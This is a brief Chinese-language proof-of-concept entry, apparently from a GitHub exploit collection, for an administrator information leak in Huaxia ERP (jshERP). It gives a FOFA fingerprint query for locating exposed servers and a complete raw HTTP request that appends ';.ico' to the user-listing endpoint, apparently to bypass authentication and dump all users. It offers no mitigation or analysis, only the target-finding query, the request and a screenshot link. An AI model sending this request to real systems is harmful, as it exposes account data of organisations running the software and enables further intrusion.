## 华夏ERP管理员信息泄露漏洞

## fofa
```
icon_hash="-1298131932"
```
## POC
```
GET /jshERP-boot/user/getAllList;.ico HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

![image](https://github.com/wy876/POC/assets/139549762/c56b507b-923f-46c0-a858-bfa938df0829)
